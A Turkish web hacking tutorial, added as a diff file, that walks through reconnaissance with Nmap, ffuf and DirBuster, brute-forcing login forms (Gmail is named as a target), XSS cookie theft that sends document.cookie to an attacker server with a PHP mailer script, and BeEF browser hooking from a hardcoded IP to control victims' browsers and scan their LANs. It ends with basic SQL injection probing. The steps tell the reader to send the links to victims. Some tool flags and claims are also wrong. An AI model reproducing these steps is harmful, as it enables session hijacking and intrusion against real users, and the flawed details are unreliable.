@@ -1,0 +1,572 @@
+Web Sunucu Bilgilerinin Bulunması
+Web sunucu bilgilerinin bulunması, bir web sitesinin hangi işletim sistemi, web sunucusu, uygulama sunucusu, veritabanı sunucusu gibi bileşenleri kullandığını ve bunların sürümlerini belirlemek için kullanılan bir tekniktir. Bu bilgiler, web sitesinin güvenlik açıklarını tespit etmek, saldırı vektörlerini belirlemek veya performans iyileştirmeleri yapmak için yararlı olabilir.
+Web sunucu bilgilerinin bulunması için kullanılan araçlardan iki tanesi Netcraft ve Nmap'tir. Bu araçlar, web sitesinin barındırıldığı sunucunun şu anki ve geçmişteki işletim sistemi ve web sunucu bilgilerini sorgulamak için kullanılabilir. Aşağıda bu araçların nasıl kullanılacağını açıklayacağım.
+1. Adım: Netcraft.com üzerinden domainin barındırıldığı sunucunun şu anki ve geçmiş tarihlerdeki işletim sistemi ve web sunucu bilgisinin bulunması; Site Report denilerek sitenin geçmişte tutulduğu web sunucu bilgilerine de erişilebilir.
+- Netcraft, web sitelerinin barındırıldığı sunucuların işletim sistemi, web sunucusu, IP adresi, coğrafi konum, SSL sertifikası, DNS kayıtları, ağ haritası, site sahibi, site trafiği, site popülaritesi gibi bilgileri toplayan ve analiz eden bir servistir.
+- Netcraft.com adresine giderek, arama kutusuna sorgulamak istediğimiz web sitesinin adresini yazıyoruz. Örneğin, tamindir.com adresini sorgulayalım.
+- Arama sonucunda, web sitesinin şu anki işletim sistemi, web sunucusu, IP adresi, coğrafi konum, SSL sertifikası, DNS kayıtları gibi bilgileri görüntüleyebiliriz. Ayrıca, Site Report butonuna tıklayarak, web sitesinin geçmişte tutulduğu web sunucu bilgilerine de erişebiliriz. Bu bilgiler, web sitesinin ne zaman ve nasıl değiştiğini, hangi teknolojileri kullandığını, hangi güvenlik önlemlerini aldığını görmemizi sağlar.
+2. Adım: Nmap ile işletim sistemi ve çalışan web server bilgisini alabilmek için -O ve -sV komutları birlikte kullanılmalıdır. root@pentest09: ~# nmap tamindir.com -O -sV -p 80
+- Nmap, ağ tarama, port tarama, servis tespiti, işletim sistemi tespiti, güvenlik açığı tespiti, ağ haritalama gibi işlemler yapabilen bir araçtır. Nmap, komut satırından veya grafiksel arayüzden çalıştırılabilir.
+- Nmap ile işletim sistemi ve çalışan web sunucu bilgisini almak için, -O ve -sV seçeneklerini birlikte kullanmalıyız. -O seçeneği, işletim sistemi tespiti yapmak için kullanılır. -sV seçeneği, servis tespiti yapmak için kullanılır. Ayrıca, -p seçeneği ile hangi portları taramak istediğimizi belirtebiliriz. Örneğin, -p 80 seçeneği ile sadece 80 numaralı portu (HTTP) taramak istediğimizi belirtiriz.
+- Komut satırından Nmap'i çalıştırmak için, root@pentest09: ~# nmap tamindir.com -O -sV -p 80 komutunu yazıyoruz. Bu komut, tamindir.com web sitesinin barındırıldığı sunucunun işletim sistemi ve 80 numaralı portta çalışan web sunucu bilgisini bize verir. Örneğin, aşağıdaki çıktıyı alabiliriz.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 00:00 EET
+Nmap scan report for tamindir.com (104.26.8.114)
+Host is up (0.021s latency).
+Other addresses for tamindir.com (not scanned): 172.67.69.191 104.26.9.114
+rDNS record for 104.26.8.114: tamindir.com
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Cloudflare
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.4 (95%), Linux 4.8 (95%), Linux 5.3 (95%), Linux 5.4 (95%), Linux 3.16 (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
+- Bu çıktıda, web sitesinin barındırıldığı sunucunun işletim sisteminin Linux olduğunu, web sunucusunun ise Cloudflare olduğunu görüyoruz. Ayrıca, sunucunun IP adresi, coğrafi konumu, ters DNS kaydı, ağ mesafesi gibi bilgileri de elde ediyoruz. Nmap, işletim sistemi tespiti için agresif tahminler yapar, bu yüzden sonuçların kesin olmadığını unutmamalıyız.
+Web Uygulamasına Ait Alt Dizin ve Dosyaların Keşfi
+Web uygulamalarına ait alt dizin ve dosyaların keşfi, web uygulama güvenliği testlerinde önemli bir adımdır. Bu sayede web uygulamasının yapısı, kullanılan teknolojiler, gizli veya unutulmuş dosyalar, yedek dosyalar, yönetim paneli gibi bilgiler elde edilebilir. Bu bilgiler, web uygulamasına yönelik saldırı vektörlerini belirlemek için kullanılabilir.
+Web uygulamalarına ait alt dizin ve dosyaların keşfi için çeşitli araçlar kullanılabilir. Bunlardan bazıları Nmap, Ffuf ve DirBuster'dır. Bu araçların nasıl kullanıldığını uygulama üzerinden detaylıca açıklamak için aşağıdaki adımları izleyebilirsiniz:
+- Nmap: Nmap, web sunucularının açık portlarını, çalışan servislerini ve zafiyetlerini tespit etmek için kullanılan bir ağ tarama aracıdır. Nmap ile web uygulamalarının alt dizin ve dosyalarını bulmak için http-enum isimli bir betik kullanabilirsiniz. Bu betik, web sunucularında yaygın olarak kullanılan dizin ve dosya isimlerini deneyerek bulmaya çalışır. Nmap'i kullanmak için aşağıdaki adımları takip edebilirsiniz:
+  - Nmap'i sisteminize kurun.
+  - Terminal veya komut satırı arayüzünü açın ve hedef web sunucusunun IP adresini veya alan adını belirleyin. Örneğin, hedef web sunucusunun alan adı example.com olsun.
+  - Nmap'i çalıştırmak için aşağıdaki komutu girin:
+    nmap --script http-enum -p80 example.com
+  - Bu komut, hedef web sunucusunun 80 numaralı portunda çalışan web uygulamasını tarar ve ilginç dizin ve dosyaları bulmaya çalışır. Bulduğu sonuçları ekrana yazdırır. Örneğin, aşağıdaki gibi bir çıktı alabilirsiniz:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-23 07:20 EET
+    Nmap scan report for example.com (93.184.216.34)
+    Host is up (0.015s latency).
+    Other addresses for example.com (not scanned): 2606:2800:220:1:248:1893:25c8:1946
+    rDNS record for 93.184.216.34: 93.184.216.34
+    PORT   STATE SERVICE
+    80/tcp open  http
+    |_http-enum: 
+    |   /admin/: Possible admin folder
+    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.46 (ubuntu)'
+    |   /index.html: Site appears to be a default Apache page
+    |   /robots.txt: Robots file
+    |_  /test/: Potentially interesting directory w/ listing on 'apache/2.4.46 (ubuntu)'
+    Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
+  - Bu çıktıda, web uygulamasına ait /admin, /images, /test gibi alt dizinler ve /index.html, /robots.txt gibi dosyalar görülebilir. Bu dizin ve dosyalar, web uygulamasının yapısı ve zafiyetleri hakkında ipuçları verebilir.
+  - Port numarası ve betik parametreleri değiştirilebilir. Örneğin, web uygulaması 443 numaralı portta HTTPS protokolü ile çalışıyorsa, komut şu şekilde olabilir:
+    nmap --script http-enum -p443 --script-args http-enum.scheme=https example.com
+- Ffuf: Ffuf, Go programlama dili ile yazılmış, hızlı ve esnek bir web tarama aracıdır. Ffuf ile web uygulamalarının alt dizin ve dosyalarını bulmak için bir kelime listesi kullanabilirsiniz. Bu kelime listesi, web sunucularında sıkça kullanılan veya olası dizin ve dosya isimlerini içerir. Ffuf ile web uygulamalarını tarayabilmek için öncelikle Go derleyicisini sisteminize kurmanız gerekir. Daha sonra aşağıdaki adımları takip edebilirsiniz:
+  - Go derleyicisini sisteminize kurun. 
+  - Terminal veya komut satırı arayüzünü açın ve Ffuf'u indirmek için aşağıdaki komutu girin:
+    go get -u github.com/ffuf/ffuf
+  - Bu komut, Ffuf'u sisteminize indirir ve kurar. Ffuf'u çalıştırmak için aşağıdaki komutu girin:
+    ffuf -w <kelime listesi> -u <hedef>/FUZZ
+  - Bu komut, hedef web uygulamasının URL'sine kelime listesindeki kelimeleri ekleyerek istek gönderir ve sunucunun verdiği yanıtları analiz eder. Bulduğu sonuçları ekrana yazdırır. Örneğin, aşağıdaki gibi bir komut kullanabilirsiniz:
+    ffuf -w seclists/Discovery/Web-Content/common.txt -u example.com/FUZZ
+  - Bu komut, seclists adlı bir kelime listesi kullanarak example.com web uygulamasını tarar. seclists, web sunucularında sıkça kullanılan dizin ve dosya isimlerini içeren hazır bir kelime listesidir. Örneğin, aşağıdaki gibi bir çıktı alabilirsiniz:
+    :: Progress: [46156/46156] :: Job [1/1] :: 74 req/sec :: Duration: [0:10:21] :: Errors: 0 ::
+    +-----------------+--------+-----------------------+
+    |       URL       | STATUS |        SIZE           |
+    +-----------------+--------+-----------------------+
+    | /admin          | 200    | 2 KB                  |
+    | /images         | 200    | 1 KB                  |
+    | /index.html     | 200    | 45 B                  |
+    | /robots.txt     | 200    | 67 B                  |
+    | /test           | 200    | 1 KB                  |
+    +-----------------+--------+-----------------------+
+  - Bu çıktıda, web uygulamasına ait /admin, /images, /test gibi alt dizinler ve /index.html, /robots.txt gibi dosyalar görülebilir. Bu dizin ve dosyalar, web uygulamasının yapısı ve zafiyetleri hakkında ipuçları verebilir.
+  - Ffuf'un parametreleri değiştirilebilir. Örneğin, web uygulaması HTTPS protokolü ile çalışıyorsa, -x parametresi ile şema belirtilebilir:
+  ffuf -w seclists/Discovery/Web-Content/common.txt -u example.com/FUZZ -x https
+DirBuster, web sunucularında dizin ve dosya isimlerini kaba kuvvet yöntemiyle bulmaya çalışan bir Java uygulamasıdır. DirBuster ile web uygulamalarının alt dizin ve dosyalarını bulmak için bir kelime listesi veya saf kaba kuvvet modu kullanabilirsiniz. DirBuster, Kali Linux dağıtımı ile birlikte gelir. DirBuster'i kullanmak için aşağıdaki adımları takip edebilirsiniz:
+  - Terminal veya komut satırı arayüzünü açın ve hedef web sunucusunun IP adresini veya alan adını belirleyin. Örneğin, hedef web sunucusunun alan adı example.com olsun.
+  - DirBuster'i çalıştırmak için aşağıdaki komutu girin:
+    dirbuster -u example.com
+  - Bu komut, DirBuster'in grafiksel arayüzünü açar ve hedef web uygulamasını otomatik olarak doldurur. Daha sonra ayarlar menüsünden kelime listesi, dil uzantısı, istek metodu ve diğer seçenekleri belirleyebilirsiniz. Taramayı başlatmak için Start Scan butonuna basabilirsiniz. Bulduğu sonuçları ekrana yazdırır. Örneğin, aşağıdaki gibi bir çıktı alabilirsiniz:
+    +-----------------+--------+-----------------------+
+    |       URL       | STATUS |        SIZE           |
+    +-----------------+--------+-----------------------+
+    | /admin          | 200    | 2 KB                  |
+    | /images         | 200    | 1 KB                  |
+    | /index.html     | 200    | 45 B                  |
+    | /robots.txt     | 200    | 67 B                  |
+    | /test           | 200    | 1 KB                  |
+    +-----------------+--------+-----------------------+
+  - Bu çıktıda, web uygulamasına ait /admin, /images, /test gibi alt dizinler ve /index.html, /robots.txt gibi dosyalar görülebilir. Bu dizin ve dosyalar, web uygulamasının yapısı ve zafiyetleri hakkında ipuçları verebilir.
+HTML Form Auth. Korumalı Sayfalara Yönelik Kaba Kuvvet Parola Denemeleri
+Web uygulamalarına yönelik kaba kuvvet saldırıları yapmak için Burp Suite ve Fireforce gibi araçları kullanabilirsiniz. Bu araçlar, web sayfalarındaki kimlik doğrulama formlarını otomatik olarak doldurarak doğru kullanıcı adı ve parola kombinasyonunu bulmaya çalışır. Bu işlemi yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Web tarayıcınızda (Firefox gibi) proxy ayarlarınızı yapın. Proxy sunucu adresi olarak 127.0.0.1 ve port olarak 8080 girin. Bu şekilde web trafiğiniz Burp Suite uygulamasına yönlendirilecektir.
+2. Adım: Burp Suite uygulamasını çalıştırın. Proxy sekmesindeki Options altında Intercept Client Requests bölümünde "Support invisible proxying for non-HTTP aware clients" seçeneğini işaretleyin. Bu, HTTPS trafiğini de yakalamanızı sağlayacaktır.
+3. Adım: Kaba kuvvet saldırısı yapmak istediğiniz web sayfasını (gmail gibi) açın. Kullanıcı adı ve parola girin, ancak giriş yapmayın. Burp Suite uygulamasında Proxy sekmesindeki Intercept altında "Intercept is on" seçeneğini aktif hale getirin. Bu, web isteğinizi yakalamanızı sağlayacaktır.
+4. Adım: Yakaladığınız web isteğine sağ tıklayın ve "Send to Intruder" seçeneğini seçin. Intruder sekmesine geçin ve Positions altında "Clear §" butonuna tıklayın. Ardından kullanıcı adı ve parola alanlarını seçin ve "Add §" butonuna tıklayın. Bu, saldırıda değiştirilecek parametreleri belirlemenizi sağlayacaktır. Attack type olarak "Sniper" seçin. Bu, tek bir parametreyi değiştirerek saldırı yapmanızı sağlayacaktır.
+5. Adım: Payloads sekmesine geçin ve Payload set olarak 1'i seçin. Payload type olarak "Simple list" seçin. Payload options bölümünde denemek istediğiniz kullanıcı adlarını girin veya "Load" butonu ile bir dosyadan kullanıcı adlarını yükleyin. Payload set olarak 2'yi seçin ve aynı işlemi parolalar için de yapın.
+6. Adım: Saldırıyı başlatmak için "Start attack" butonuna tıklayın. Results sekmesinde saldırının sonuçlarını görebilirsiniz. Length ve Status kodu gibi değerlere bakarak doğru kullanıcı adı ve parola kombinasyonunu bulmaya çalışın. Genellikle, doğru kombinasyon farklı bir uzunluk veya durum kodu verir. Örneğin, gmail'de doğru kombinasyon 302 durum kodu ve 0 uzunluk değeri verir.
+7. Adım: Doğru kombinasyonu bulduğunuzda, sonuca sağ tıklayın ve "Send to Repeater" seçeneğini seçin. Repeater sekmesine geçin ve "Go" butonuna tıklayın. Bu, web isteğini tekrar göndermenizi sağlayacaktır. Response sekmesinde web sayfasının yanıtını görebilirsiniz. Eğer başarılı bir şekilde giriş yaptıysanız, web sayfasının içeriğini görebilirsiniz.
+Bu adımları takip ederek web uygulamalarına yönelik kaba kuvvet saldırıları yapabilirsiniz. 
+Fireforce kullanarak hedefe yönelik kaba kuvvet saldırısı yapma.(Fireforce bir firefox eklentisidir.)
+Fireforce, Firefox eklentisi olarak kullanılan bir kaba kuvvet saldırısı aracıdır. Kaba kuvvet saldırısı, bir web sitesi, parola, kullanıcı adı veya şifreli bir mesajı deneme yanılma yöntemiyle kırmaya çalışan bir siber saldırı türüdür.  Fireforce, web sitelerindeki giriş formlarına karşı kaba kuvvet saldırısı yapmak için tasarlanmıştır.
+Fireforce kullanarak hedefe yönelik kaba kuvvet saldırısı yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Fireforce eklentisini Firefox tarayıcınıza kurun. Eklentiyi indirin.
+2. Adım: Saldırı yapmak istediğiniz web sitesine gidin ve giriş formunu bulun. Formun üzerine sağ tıklayın ve Fireforce menüsünden "Start Brute Force Attack" seçeneğini seçin.
+3. Adım: Fireforce, size saldırı için kullanacağınız kelime listesini (wordlist) seçmenizi isteyecektir. Kelime listesi, olası parolaları içeren bir metin dosyasıdır. Fireforce, bazı hazır kelime listeleri sunar. Bunlardan birini seçebilirsiniz veya kendi kelime listenizi yükleyebilirsiniz. Kelime listenizi seçtikten sonra "OK" butonuna tıklayın.
+4. Adım: Fireforce, size web sunucusunun döneceği hata mesajını soracaktır. Bu, saldırının başarısız olduğunu gösteren bir mesajdır. Örneğin, "Invalid login!" veya "Wrong password!" gibi. Bu mesajı öğrenmek için, bir kereye mahsus yanlış bir kullanıcı adı ve parola girerek giriş yapmayı deneyin. Web sunucusunun verdiği hata mesajını kopyalayın ve Fireforce penceresine yapıştırın. Ardından "OK" butonuna tıklayın.
+5. Adım: Fireforce, size saniyede kaç istek göndermek istediğinizi soracaktır. Bu, saldırının hızını belirleyen bir parametredir. Daha yüksek bir değer seçerseniz, saldırı daha hızlı olur, ancak web sunucusu tarafından engellenebilir veya yavaşlayabilir. Daha düşük bir değer seçerseniz, saldırı daha yavaş olur, ancak web sunucusu tarafından fark edilmeyebilir veya daha stabil çalışabilir. Bu değeri kendiniz belirleyebilir veya Fireforce'un önerdiği varsayılan değeri kullanabilirsiniz. Değerinizi girdikten sonra "Save" butonuna tıklayın.
+6. Adım: Fireforce, saldırıyı başlatacaktır. Kelime listesindeki her parolayı tek tek deneyerek doğru olanı bulmaya çalışacaktır. Saldırı sırasında, Fireforce'un durumunu, denenen parolaları ve geçen süreyi görebilirsiniz. Saldırıyı durdurmak isterseniz, "Stop" butonuna tıklayabilirsiniz.
+7. Adım: Fireforce, doğru parolayı bulduğunda, size bildirecektir. Parolayı kopyalayabilir veya giriş formuna otomatik olarak doldurmasını sağlayabilirsiniz. Böylece web sitesine giriş yapabilirsiniz.
+Fireforce kullanarak hedefe yönelik kaba kuvvet saldırısı yapmak bu kadar basittir. Ancak, bu saldırı yönteminin bazı dezavantajları ve riskleri olduğunu da unutmayın. Örneğin:
+- Fireforce, sadece web sitelerindeki giriş formlarına karşı çalışır. Diğer protokollere veya sistemlere karşı etkili değildir.
+- Fireforce, kelime listesine bağlıdır. Eğer kelime listesinde doğru parola yoksa, saldırı başarısız olur.
+- Fireforce, saldırıyı tespit eden web sunucuları tarafından engellenebilir veya yavaşlatılabilir.
+- Fireforce, yasal olmayan bir saldırı yöntemidir. İzinsiz olarak bir web sitesine giriş yapmak, suç teşkil edebilir.
+XSS Kullanarak Kurbana Ait Cookie Bilgilerine Erişim
+XSS, Cross-Site Scripting, bir web sitesindeki güvenlik açığından yararlanarak kullanıcılara kötü amaçlı kod göndermeyi sağlayan bir saldırı türüdür. XSS saldırısı ile bir kullanıcının cookie bilgisini çalmak, onun oturumunu ele geçirmek veya web sitesinin içeriğini değiştirmek mümkündür.
+XSS saldırısı yapmak için aşağıdaki adımları izleyebilirsiniz:
+XSS (Siteler Arası Komut Dosyası) saldırısı, bir web sitesine kötü amaçlı kod enjekte etmek ve kullanıcıların tarayıcılarını etkilemek için kullanılan bir siber saldırı yöntemidir. XSS saldırısı ile bir kullanıcının cookie bilgilerini ele geçirmek ve onun oturumunu ele geçirmek mümkündür. Bu işlemi yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Hedef web sitesinde XSS açığı olan bir yer bulun. Bu genellikle kullanıcı girişi alınan veya dinamik içerik gösterilen sayfalarda olur. XSS açığını test etmek için <script>alert('XSS')</script> gibi basit bir JavaScript kodu deneyebilirsiniz. Eğer bu kod sayfada çalıştırılırsa, XSS açığı olduğunu anlayabilirsiniz. Cookie bilgisini almak için document.cookie fonksiyonunu kullanabilirsiniz. Örneğin, http://testasp.vulnweb.com/Search.asp?tfSearch=<script>alert(document.cookie)</script> URL'sini denerseniz, sayfada cookie değerini gösteren bir uyarı kutusu göreceksiniz.
+2. Adım: Cookie değerini kendi sunucunuza veya e-posta adresinize göndermek için bir PHP scripti hazırlayın. Bu script, cookie değerini bir GET parametresi olarak alır ve e-posta ile size iletir. Aşağıda bir örnek script verilmiştir. Bu scripti kendi sunucunuza cookie.php ismiyle kaydedin ve e-posta adresinizi değiştirin.
+php
+<?php
+$cookie = $_GET["cookie"]; // cookie değerini GET parametresinden al
+mail("your_email@example.com", "New cookie found", $cookie); // cookie değerini e-posta ile gönder
+?>
+3. Adım: XSS açığı olan web sitesine bir link oluşturun. Bu link, cookie değerini alıp scriptinize yönlendiren bir JavaScript kodu içermelidir. Örneğin, http://testasp.vulnweb.com/Search.asp?tfSearch=<script>location.href = 'http://your_server.com/cookie.php?cookie='+document.cookie;</script> gibi bir link oluşturabilirsiniz. Bu linki, hedef web sitesine giriş yapmış olan kurbanlara bir şekilde ulaştırın. Bunu e-posta, sosyal medya veya başka bir yöntemle yapabilirsiniz. Kurbanlar linki tıkladığında, cookie değerleri scriptinize gönderilecektir.
+4. Adım: Scriptinizden gelen e-postaları kontrol edin. Her e-posta, bir kurbanın cookie değerini içerecektir. Bu cookie değerleri, kurbanların oturum bilgilerini saklar. Örneğin, ASPSESSIONIDCCCRRCRD=OGMOLPFCCOJHJEEGKOPFAMGD gibi bir cookie değeri görebilirsiniz.
+5. Adım: Cookie değerini tarayıcınıza ekleyin ve hedef web sitesine girin. Böylece, kurbanın oturumunu ele geçirmiş olursunuz. Bu işlemi yapmak için Cookie Manager+ gibi bir Firefox eklentisi kullanabilirsiniz. Bu eklenti ile cookie değerini düzenleyebilir veya yeni bir cookie ekleyebilirsiniz. Cookie değerini ekledikten sonra, hedef web sitesini yenileyin. Eğer cookie değeri geçerliyse, kurbanın hesabına giriş yapmış olacaksınız. Bu şekilde, kurbanın hesabındaki verilere erişebilir, onun adına işlem yapabilir veya hesabını ele geçirebilirsiniz.
+Bu adımları takip ederek, XSS saldırısı ile bir web sitesindeki kullanıcıların cookie bilgilerini ele geçirebilir ve onların oturumlarını ele geçirebilirsiniz. Bu saldırının başarılı olması için, hedef web sitesinde XSS açığı olması, kurbanların linki tıklaması ve cookie değerinin geçerli olması gerekmektedir. Bu saldırıdan korunmak için, web sitelerinin XSS açıklarını gidermesi, kullanıcıların güvenilir olmayan linklere tıklamaması ve tarayıcılarının güvenlik ayarlarını artırması önerilir.
+XSS Kullanarak Kullanıcının Browserını Yönetme beef (beef xss die arat)
+XSS, Cross-Site Scripting anlamına gelir ve web uygulamalarında yaygın bir güvenlik açığıdır. Bu açık, saldırganın kullanıcıların tarayıcılarında çalışacak kötü niyetli betikleri (script) enjekte etmesine izin veren zayıf bir kodlama veya güvenlik politikası nedeniyle ortaya çıkar.
+XSS saldırıları, kullanıcının tarayıcısında çalışan betikler sayesinde oturum ele geçirme, hassas bilgi çalma, kötü yönlendirme veya web uygulama güvenliğini zayıflatma gibi potansiyel zararlar verebilir.
+XSS saldırılarını önlemek için web uygulamalarının girdi doğrulaması, çıktı kodlaması, güvenlik başlıkları, güvenlik duvarları ve güvenlik testleri gibi önlemler alması gerekir.
+XSS saldırılarını gerçekleştirmek için ise web uygulamalarının zayıf noktalarını tespit etmek, kötü niyetli betikleri enjekte etmek, kullanıcıları tetiklemek ve kodun çalışmasını sağlamak gibi adımlar izlenir.
+BeEF, Browser Exploitation Framework kısaltmasıdır ve web tarayıcısına odaklanan bir sızma testi aracıdır. BeEF, profesyonel bir testçinin, tarayıcıda çalışan betikleri kullanarak hedef ortamın gerçek güvenlik durumunu değerlendirmesine olanak tanır.
+BeEF, bir veya daha fazla web tarayıcısını ele geçirir ve onları yönlendirilmiş komut modülleri ve daha ileri saldırılar başlatmak için köprübaşı olarak kullanır.
+BeEF'i kullanarak XSS saldırıları gerçekleştirmek için aşağıdaki adımları takip edebilirsiniz:
+1. Adım: BeEF'i indirmek için GitHubta bulunan şu sayfayı https://github.com/beefproject/beef kullanabilirsiniz. Buradaki zip dosyasını indirerek unzip edin. Alternatif olarak, Kali Linux gibi bazı Linux dağıtımlarında sudo apt install beef-xss komutu ile de kurulum yapabilirsiniz.
+2. Adım: BeEF web yönetim panelini açmak için terminalde beef-xss komutunu çalıştırın. Bu komut, BeEF servisini başlatacak ve size Web UI ve Hook adreslerini verecektir. Web UI, BeEF'in web arayüzüdür ve buradan saldırıları yönetebilirsiniz. Hook, BeEF'in ürettiği ve kurban tarayıcısında çalışacak JavaScript dosyasıdır. Web UI adresini tarayıcınızda açın ve ön tanımlı kullanıcı adı/parola ile giriş yapın (beef/beef). Bu bilgileri değiştirmek için beef-xss -h komutunu kullanabilirsiniz.
+3. Adım: Sisteme giriş yaptıktan sonra, XSS açıklığı olan bir web uygulaması bulun veya oluşturun. Bu web uygulamasına, Hook adresini içeren bir link göndererek kurbanın tarayıcısını ele geçirmeye çalışın. Örneğin, http://www.example.com/sort_news?ID=<script src=http://6.6.6.121:3000/hook.js></script> gibi bir link oluşturabilirsiniz. Bu linki kurbanın tıklayacağı bir şekilde gönderin. Örneğin, e-posta, sosyal medya veya başka bir web sayfası aracılığıyla.
+4. Adım: Kurban linki tıkladığında, tarayıcısında Hook dosyası çalışacak ve BeEF web arayüzünde kurbanın tarayıcısı görünecektir. Buradan kurbanın tarayıcısını yönetebilirsiniz. BeEF, kurbanın iç ağında port tarama, kurbanın kamera görüntüsü alma, kurbanın tarayıcısında ses çıkarma gibi birçok faaliyet yapmanıza olanak tanıyan çeşitli komut modülleri sunar. Bu modülleri, web arayüzündeki Commands sekmesinden seçebilir ve çalıştırabilirsiniz.
+5. Adım: Örnek olarak, kurbanın tarayıcısında bir ses çıkarmak istiyorsanız, Play Sound modülünü seçebilir ve bir ses dosyasının URL'sini girebilirsiniz. Bu ses dosyası, kurbanın tarayıcısında oynatılacaktır. Ses dosyası olarak, güncel bir müzik parçası veya ilginç bir ses efekti kullanabilirsiniz. Örneğin, https://www.soundjay.com/button/beep-01a.wav gibi bir URL girebilirsiniz.
+XSS Üzerinden Yerel Ağ Taraması beef (kurbanın browserından port tarama)
+XSS, yani Cross Site Scripting, web uygulamalarında bulunan bir güvenlik zafiyetidir. XSS, web uygulamasında kullanıcıdan veri alınarak bunun DOM Dökümasyonuna işlendiği her yerde ortaya çıkabilir. XSS, saldırganın kurbanın tarayıcısında istediği kodu çalıştırmasına olanak tanır.
+BeEF, yani Browser Exploitation Framework, XSS açıklarını kullanarak kurbanın tarayıcısını yönetmeye yarayan bir penetrasyon testi aracıdır. BeEF, kurbanın tarayıcısına bir JavaScript kodu enjekte ederek, onunla bir bağlantı kurar ve çeşitli komut modülleri göndererek kurbanın sistemi ve ağı hakkında bilgi toplar.
+XSS üzerinden yerel ağ taraması yapmak için şu adımları izleyebilirsiniz:
+1. Adım: XSS açığı bulunan bir web uygulaması bulun. Bu web uygulaması, kullanıcıdan veri alarak bunu sayfaya işleyen bir parametre içermelidir. Örneğin, http://www.example.com/sort_news?ID= gibi bir URL olabilir. Burada ID parametresi XSS açığına sahiptir.
+2. Adım: BeEF aracını kurun ve çalıştırın. BeEF aracını https://github.com/beefproject/beef adresinden indirebilirsiniz. BeEF aracını kurmak ve çalıştırmak için https://beefproject.com/ adresindeki dokümantasyonu takip edebilirsiniz. BeEF aracını çalıştırdığınızda, bir web arayüzüne erişebilirsiniz. Bu arayüzde, BeEF tarafından üretilen bir JavaScript kodu göreceksiniz. Bu kod, http://6.6.6.121:3000/hook.js gibi bir URL şeklindedir. Bu URL, BeEF sunucunuzun IP adresi ve port numarasını içerir.
+3. Adım: XSS açığı bulunan web uygulamasına BeEF JavaScript kodunu enjekte edin. Bunun için, XSS açığı bulunan parametreye <script src=http://6.6.6.121:3000/hook.js></script> gibi bir kod ekleyin. Örneğin, http://www.example.com/sort_news?ID=<script src=http://6.6.6.121:3000/hook.js></script> gibi bir URL oluşturun. Bu URL'i kurbanınıza gönderin ve onun bu adresi ziyaret etmesini sağlayın. Kurban bu adresi ziyaret ettiğinde, BeEF JavaScript kodu kurbanın tarayıcısında çalışacak ve BeEF sunucunuzla bir bağlantı kuracaktır.
+4. Adım: BeEF web arayüzünde kurbanın tarayıcısını yönetin. BeEF web arayüzünde, kurbanın tarayıcısının bağlandığını göreceksiniz. Kurbanın tarayıcısına tıklayarak, ona çeşitli komut modülleri gönderebilirsiniz. Komut modülleri, kurbanın tarayıcısında çalışan JavaScript kodlarıdır. Bu kodlar, kurbanın sistemi ve ağı hakkında bilgi toplamanıza, kurbanın tarayıcısını yönlendirmenize, kurbanın klavye girişlerini yakalamanıza, kurbanın web kamerasını açmanıza ve daha birçok işlem yapmanıza olanak tanır.
+5. Adım: Komut modülleri arasından Port Scanner modülünü seçin. Bu modül, kurbanın tarayıcısını kullanarak yerel ağda port taraması yapmanızı sağlar. Bu modülü seçtiğinizde, hedef IP adresi(leri) girmeniz istenecektir. Buraya, kurbanın ağındaki IP adreslerini veya IP adres bloklarını girebilirsiniz. Örneğin, 192.168.1.1 veya 192.168.1.0/24 gibi. Daha sonra, taramak istediğiniz port aralığını girebilirsiniz. Örneğin, 1-1024 gibi. Son olarak, tarama başlat butonuna basarak, port taramasını başlatabilirsiniz. Port taraması sonucunda, kurbanın ağındaki açık portları ve çalışan servisleri görebilirsiniz.
+Basit SQL Injection Denemeleri
+Hedef web uygulamasında input alan bölümlere manuel olarak farklı karakterler(metadata)  girerek SQL sorgularında manipülasyonlar oluşturarak veritabanın bunlara karşı cevaplarını görmek ve  sql injection açıklığı tespit etme.
+SQL injection, bir web uygulamasının veritabanına gönderilen SQL sorgularını kötüye kullanarak yetkisiz veri erişimi veya değişikliği sağlayan bir saldırı türüdür. SQL injection açıklığı bulunan bir web uygulaması, HTTP yanıtlarında ilgili SQL sorgusunun sonuçlarını veya veritabanı hatalarının ayrıntılarını içermeyebilir. Bu durumda, kör SQL injection denilen bir saldırı türü kullanılabilir.
+Kör SQL injection, veritabanına doğru veya yanlış sorular sorarak ve uygulamanın yanıtına göre cevabı belirleyerek çalışır. Bu saldırı, web uygulamasının genel hata mesajları gösterdiği, ancak SQL injection'a karşı savunmasız olan kodu gidermediği durumlarda kullanılır.
+Kör SQL injection saldırısı yapmak için, aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Saldırıya açık bir parametre bulun. Bu, web uygulamasının URL'sinde, HTTP istek gövdesinde veya HTTP çerezlerinde olabilir. Örneğin, [4](http://testphp.vulnweb.com/listproducts.php?cat=) URL'sinde cat parametresi SQL injection'a açık olabilir. Bu parametrenin değerini değiştirerek, web uygulamasının farklı şekilde davranıp davranmadığını kontrol edin. Örneğin, cat parametresine 1 yerine 1' veya 1=1 gibi bir değer verin. Eğer web uygulaması hata mesajı döndürürse, bu parametre SQL injection'a açıktır.
